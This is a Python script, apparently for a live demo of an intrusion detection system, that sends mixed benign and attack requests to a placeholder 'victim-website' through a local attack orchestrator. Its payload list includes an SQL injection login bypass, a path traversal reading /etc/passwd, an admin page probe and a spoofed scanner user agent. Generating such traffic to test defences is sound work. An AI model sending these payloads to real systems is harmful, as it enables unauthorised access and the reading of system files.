# scripts/run_live_demo.py

import requests
import time
import random

# The URL for our Attack Orchestrator API
ORCHESTRATOR_API_URL = "http://localhost:8000/attack/curl"

# A sequence of attacks for the demo
DEMO_PAYLOADS = [
    {"type": "Benign Traffic", "payload": {"target": "http://victim-website/"}},
    {"type": "Benign Traffic", "payload": {"target": "http://victim-website/index.html"}},
    {"type": "Attack: Recon", "payload": {"target": "http://victim-website/admin.php"}},
    {"type": "Attack: SQLi", "payload": {"target": "http://victim-website/login", "args": "-H \"Content-Type: application/json\" -d '{\"username\": \"admin'\\''--\", \"password\": \"anything\"}'"}},
    {"type": "Benign Traffic", "payload": {"target": "http://victim-website/"}},
    {"type": "Attack: Path Traversal", "payload": {"target": "http://victim-website/static/../../../../etc/passwd"}},
    {"type": "Attack: Malicious UA", "payload": {"target": "http://victim-website/", "args": "-A \"Nikto/2.1.5\""}}
]

def launch_attack(payload):
    """Sends a single attack order to the orchestrator API."""
    try:
        requests.post(ORCHESTRATOR_API_URL, json=payload, timeout=5)
        print(f"  > Request sent for target: {payload.get('target')}")
    except requests.exceptions.RequestException as e:
        print(f"  > Error sending request: {e}")

def main():
    """Runs the live demo attack sequence."""
    print("--- Starting Live Attack Simulation for AIS Demo ---")
    print(f"Attacker API is at: {ORCHESTRATOR_API_URL}")
    
    # Give the user a moment to get the Defender running
    input("\nPress Enter to begin the attack sequence...")

    for item in DEMO_PAYLOADS:
        print(f"\nLaunching step: {item['type']}...")
        launch_attack(item['payload'])
        # Wait a random time to make the attack feel more real
        time.sleep(random.randint(2, 5))

    print("\n--- Live demo attack sequence finished. ---")

if __name__ == "__main__":
    main()